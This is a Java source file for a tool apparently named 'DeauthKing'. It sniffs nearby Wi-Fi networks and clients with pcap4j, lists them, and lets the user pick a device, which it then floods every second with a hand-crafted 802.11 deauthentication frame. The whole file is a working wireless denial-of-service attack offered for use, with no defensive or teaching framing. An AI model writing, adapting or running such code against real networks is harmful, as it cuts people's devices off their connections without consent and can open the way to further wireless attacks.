import org.pcap4j.core.*;
import org.pcap4j.packet.UnknownPacket;
import java.io.*;
import java.util.*;

class Main {

    public static void main(String[] args) throws IOException {

        UI ui = new UI();
        (new Thread(ui)).start();

        List<Network> found = Collections.synchronizedList(new ArrayList<Network>());
        final MessageCollector collector = new MessageCollector();
        (new Thread(collector)).start();

        ui.setDefault("" +
                " _____                   _   _     _  ___             \n" +
                "|  __ \\                 | | | |   | |/ (_)            \n" +
                "| |  | | ___  __ _ _   _| |_| |__ | ' / _ _ __   __ _ \n" +
                "| |  | |/ _ \\/ _` | | | | __| '_ \\|  < | | '_ \\ / _` |\n" +
                "| |__| |  __/ (_| | |_| | |_| | | | . \\| | | | | (_| |\n" +
                "|_____/ \\___|\\__,_|\\__,_|\\__|_| |_|_|\\_\\_|_| |_|\\__, |\n" +
                "                                                 __/ |\n" +
                "                                                |___/ \n" +
                "\n");
        ui.setStatus("");

        class updateUI extends TimerTask {
            private final List<Network> found;
            UI ui = null;

            updateUI(List<Network> found, UI ui) {
                this.found = found;
                this.ui = ui;
            }

            public void run() {
                synchronized (found) {
                    found.clear();
                    ui.clear();
                    found.addAll(collector.getNetworks());
                    int count = 0;

                    for (Network nw : found) {
                        if (nw.getBssid() != null && nw.getName() != null) {
                            count++;
                            ui.printLine("["+count+"] " + nw.getBssidString() + " (" + nw.getName() + ")");
                            for (Node nd : nw.getNodes()) {
                                count++;
                                ui.printLine("      [" + count + "] " + nd.getMacString() + " " +  ((nd.getSelected()) ? "<-- DEAUTHING" : ""));
                            }
                        }

                        /*
                        System.out.println("---ALL-----");
                        for (Node nd : nw.getNodes()) {
                            System.out.println(nd.getMacString());
                        }
                        System.out.println("------------");*/
                    }
                }
            }
        }

        Timer t1 = new Timer();
        t1.schedule(new updateUI(found, ui), 0, 1000);


        for (String input = ui.getUserInput(); true; input = ui.getUserInput()) {

            synchronized (found) {
                try {
                    if (input != "") {
                        int selected = Integer.parseInt(input);
                        System.out.println("PRINTED: "+selected);
                        int count = 0;
                        for (Network nw : found) {
                            //if(count == selected)
                            //Death All In Net*/
                            if (nw.getBssid() != null && nw.getName() != null) {
                                count++;
                                for (Node nd : nw.getNodes()) {
                                    count++;
                                    if (count == selected) {
                                        nd.setSelected(true);
                                        System.out.println("Selected: " + nd.getMacString() + " : " + nw.getBssidString());
                                        deauth(nd.getMac(), nw.getBssid());
                                    }
                                }
                            }
                        }
                    }
                } catch (PcapNativeException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (NotOpenException e) {
                    e.printStackTrace();
                } catch (NumberFormatException e) {
                    ui.setStatus("ERROR: Index must be a number");
                }
            }
        }
    }

    private static void deauth(byte[] nodeMac, byte[] bssidMac) throws PcapNativeException, NotOpenException, InterruptedException {
        PcapHandle.Builder bhndl = new PcapHandle.Builder("en0");
        bhndl.rfmon(true);
        bhndl.snaplen(65536);
        bhndl.timeoutMillis(50);

        PcapHandle hndl = bhndl.build();

        byte[] data = {
                (byte) 0x00, (byte) 0x00, (byte) 0x19, (byte) 0x00, (byte) 0x6f, (byte) 0x08, (byte) 0x00, (byte) 0x00,
                (byte) 0xca, (byte) 0x20, (byte) 0xaa, (byte) 0xd4, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x10, (byte) 0x02, (byte) 0x9e, (byte) 0x09, (byte) 0x80, (byte) 0x04,
                (byte) 0xd3, (byte) 0x9e, (byte) 0x00, (byte) 0xa0, (byte) 0x00, (byte) 0x3a, (byte) 0x01,
                bssidMac[0], bssidMac[1], bssidMac[2], bssidMac[3], bssidMac[4], bssidMac[5], nodeMac[0],
                nodeMac[1], nodeMac[2], nodeMac[3], nodeMac[4], nodeMac[5], (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xd0, (byte) 0x02, (byte) 0x1C,
                (byte) 0x00, (byte) 0x27, (byte) 0x8a, (byte) 0x60, (byte) 0x45
        };
        UnknownPacket packet = UnknownPacket.newPacket(data, 0, 55);

        class deathUser extends TimerTask {

            UnknownPacket packet = null;
            PcapHandle hndl = null;

            deathUser(UnknownPacket packet, PcapHandle hndl) {
                this.packet = packet;
                this.hndl = hndl;
            }

            @Override
            public void run() {
                try {
                    hndl.sendPacket(packet);
                    //Thread.sleep(500);
                } catch (PcapNativeException e) {
                    e.printStackTrace();
                } catch (NotOpenException e) {
                    e.printStackTrace();
                }
            }
        }

        Timer t1 = new Timer();
        t1.schedule(new deathUser(packet, hndl), 0, 1000);
    }
}